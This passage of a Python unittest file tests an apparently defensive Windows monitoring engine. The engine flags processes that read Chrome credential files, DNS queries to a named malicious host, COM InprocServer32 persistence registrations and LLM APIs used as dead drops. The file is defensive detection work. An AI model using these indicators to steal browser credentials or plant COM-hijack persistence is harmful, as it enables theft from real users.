        self.assertNotIn(("suspend", 604), self.actions.calls)
        self.assertNotIn(r"c:\games\launcher.exe", [p.lower() for p in self.engine.known_app_paths()])
        # 判断があるまで、遮断の通知で勝手に許可へ戻らない
        gate.queue = [BlockedConnect("app-id", "8.8.8.8", 443, 6, 1000.0)]
        self.inspector.inspect_image = lambda _app: self.inspector.procs[604]
        self.engine.poll_once()
        self.assertEqual(gate.permitted, [])
        ok, _ = self.engine.decide(alert.id, RESUME)
        self.assertTrue(ok)
        self.assertEqual(gate.permitted, ["app-id"])
        self.assertFalse(self.engine._gate_apps["app-id"].revoked)

    def real_hit(self, pid=600, image=BAD, owners=("chrome.exe",)):
        self.traps.hits = [TrapHit(r"C:\U\Login Data", pid, image, "real", owners)]
        self.engine.poll_once()

    def test_real_file_is_record_only_by_default(self):
        self.traps.enforce = False
        self.real_hit()
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.actions.calls, [])
        event = self.store.recent_events()[0]
        self.assertEqual((event["event"], event["name"]), ("watch_read", "bad.exe"))

    def test_real_file_stops_when_enforced(self):
        self.traps.enforce = True
        self.real_hit()
        self.assertEqual(self.alerts[0].action, "suspended")
        self.assertIn("本物の認証ファイル", self.alerts[0].assessment.reasons[0].text)

    def test_real_file_owner_is_ignored(self):
        self.traps.enforce = True
        chrome = r"C:\Program Files\Google\Chrome\Application\chrome.exe"
        self.inspector.add(ProcFacts(605, 1, "chrome.exe", chrome, None, None, "valid"))
        self.real_hit(605, chrome)
        self.assertEqual(self.alerts, [])
        self.assertEqual(self.store.recent_events(), [])

    def test_fake_owner_is_not_ignored(self):
        self.traps.enforce = True
        fake = r"C:\Users\u\Downloads\chrome.exe"
        self.inspector.add(ProcFacts(606, 1, "chrome.exe", fake, None, None, "unsigned"))
        self.real_hit(606, fake)
        self.assertEqual(self.alerts[0].action, "suspended")

    def test_exited_reader_is_reported(self):
        self.hit(12345, r"C:\Temp\gone.exe")
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertEqual(self.actions.calls, [])

    def test_reused_pid_is_not_suspended(self):
        self.hit(600, r"C:\Temp\other.exe")
        self.assertEqual(self.alerts[0].action, "exited")
        self.assertEqual(self.actions.calls, [])

    def test_benign_and_trusted_and_self_are_ignored(self):
        self.inspector.add(ProcFacts(602, 1, "MsMpEng.exe", r"C:\ProgramData\Defender\MsMpEng.exe", None, None, "valid"))
        self.hit(602, r"C:\ProgramData\Defender\MsMpEng.exe")
        self.hit(99, BAD)
        self.store.add_trust(BAD, "hash-1")
        self.hit()
        self.assertEqual(self.alerts, [])

    def test_observe_does_not_suspend(self):
        self.engine.observe = True
        self.hit()
        self.assertEqual(self.alerts[0].action, "observe")
        self.assertEqual(self.actions.calls, [])

    def test_hit_is_logged(self):
        self.hit()
        events = [e for e in self.store.recent_events() if e["event"] == "trap_hit"]
        self.assertEqual(events[0]["trap"], self.TRAP)


class IncidentRuleTests(unittest.TestCase):
    """NIKKE PCランチャー事件（2026年）の公開情報に合わせた判定。"""
    CLSID = r"HKU\S-1-5-21-1_Classes\CLSID\{E77CC89B-7401-4C04-8CED-149DB35ADD04}\InprocServer32\(Default)"
    DLL = r"C:\Users\u\AppData\Local\Google\Chrome\User Data\PlatformExperienceHelper\abc\platform_experience_helper.dll"

    def writer(self):
        return ProcFacts(1, 1, "launcher.exe", r"C:\Games\launcher.exe")

    def test_known_host_is_high_even_for_signed_and_browser(self):
        for path, signature in ((r"C:\Games\launcher.exe", "valid"), (r"C:\Program Files\Google\Chrome\chrome.exe", "valid")):
            facts = ProcFacts(1, 1, path.rsplit("\\", 1)[-1], path, None, None, signature)
            self.assertEqual(assess_dns(facts, "cdn.insightjs.com", ROOT).level, HIGH)
        self.assertEqual(assess_dns(self.writer(), "insightjs.com.example", ROOT).level, LOW)

    def test_browser_data_com_dll_is_high_even_if_signed(self):
        self.assertTrue(is_persistence_key(self.CLSID))
        self.assertEqual(assess_persistence(self.writer(), self.CLSID, self.DLL, "valid", ROOT).level, HIGH)

    def test_other_com_registrations(self):
        hkcu = r"HKU\S\Software\Classes\CLSID\{1}\InprocServer32\(Default)"
        self.assertEqual(assess_persistence(self.writer(), hkcu, r"C:\Users\u\AppData\Local\App\a.dll", "valid", ROOT).level, LOW)
        self.assertEqual(assess_persistence(self.writer(), hkcu, r"C:\Users\u\AppData\Local\App\a.dll", "unsigned", ROOT).level, MEDIUM)
        self.assertEqual(assess_persistence(self.writer(), hkcu, r"C:\Users\u\Downloads\a.dll", "unsigned", ROOT).level, HIGH)
        self.assertEqual(assess_persistence(self.writer(), hkcu, r"C:\Program Files\A\a.dll", "unsigned", ROOT).level, LOW)
        # 管理者権限のマルウェアも同じ手口を使える。署名つきの登録は低いまま
        machine = r"HKLM\SOFTWARE\Classes\CLSID\{1}\InprocServer32\(Default)"
        self.assertTrue(is_persistence_key(machine))
        self.assertEqual(assess_persistence(self.writer(), machine, r"C:\Program Files\A\a.dll", "valid", ROOT).level, LOW)
        self.assertFalse(is_persistence_key(r"HKU\S\Software\Classes\CLSID\{1}\LocalServer32\(Default)"))

    def test_engine_stops_signed_program_at_known_host(self):
        with tempfile.TemporaryDirectory() as temp:
            inspector, actions, alerts, sysmon = FakeInspector(), FakeActions(), [], FakeSysmon()
            inspector.add(ProcFacts(700, 1, "launcher.exe", r"C:\Games\launcher.exe", None, None, "valid"))
            engine = Engine(FakeSource(), inspector, actions, Store(temp), on_alert=alerts.append, clock=lambda: 1000.0, self_pids={99}, sysmon=sysmon)
            sysmon.items = [sysmon_xml(22, ProcessId=700, Image=r"C:\Games\launcher.exe", QueryName="insightjs.com")]
            engine.poll_once()
            self.assertEqual(alerts[0].action, "suspended")
            self.assertIn(("suspend", 700), actions.calls)

    def test_engine_reports_com_registration(self):
        with tempfile.TemporaryDirectory() as temp:
            inspector, alerts, sysmon = FakeInspector(), [], FakeSysmon()
            store = Store(temp)
            engine = Engine(FakeSource(), inspector, FakeActions(), store, on_alert=alerts.append, clock=lambda: 1000.0, self_pids={99}, sysmon=sysmon)
            sysmon.items = [sysmon_xml(13, ProcessId=701, Image=r"C:\Games\luajit.exe", TargetObject=self.CLSID, Details=self.DLL)]
            engine.poll_once()
            self.assertEqual(alerts[0].direction, "persistence")
            self.assertEqual(store.recent_events()[-1]["event"], "persistence")



class WinStatusTests(unittest.TestCase):
    def rows(self, **data):
        return {row.label: row for row in build_rows({"available": True, **data})}

    def test_unavailable(self):
        self.assertEqual(build_rows({})[0].state, "確認できず")

    def test_passive_mode_warns(self):
        row = self.rows(mode="SxS Passive Mode")["Defender の動作"]
        self.assertEqual(row.level, "warn")
        self.assertIn("働かない", row.note)
        self.assertEqual(self.rows(mode="Normal")["Defender の動作"].level, "ok")

    def test_asr_rules_are_matched_case_insensitively(self):
        rows = self.rows(asrIds=["01443614-CD74-433A-B99E-2ECDC07BFC25"], asrActions=[1])
        self.assertEqual(rows["ASR: 未知の実行ファイルを止める（普及度、経過時間、信頼リスト）"].state, "ブロック")
        self.assertEqual(rows["ASR: 難読化されたスクリプトを止める"].state, "オフ")

    def test_empty_values_do_not_fail(self):
        rows = self.rows(asrIds=None, asrActions=None, sac=None, maps=None, cfa=None)
        self.assertEqual(rows["Smart App Control"].state, "確認できず")
        self.assertEqual(rows["クラウド保護"].state, "確認できず")


class LlmHostTests(unittest.TestCase):
    def test_llm_hosts_are_watched(self):
        for host, service in (
            ("huggingface.co", "Hugging Face"), ("api-inference.huggingface.co", "Hugging Face"),
            ("generativelanguage.googleapis.com", "Gemini API"), ("api.openai.com", "OpenAI API"),
        ):
            self.assertEqual(dead_drop_service(host), service)
        self.assertIsNone(dead_drop_service("openai.com"))
        self.assertIsNone(dead_drop_service("googleapis.com"))


if __name__ == "__main__":
    unittest.main(verbosity=1)
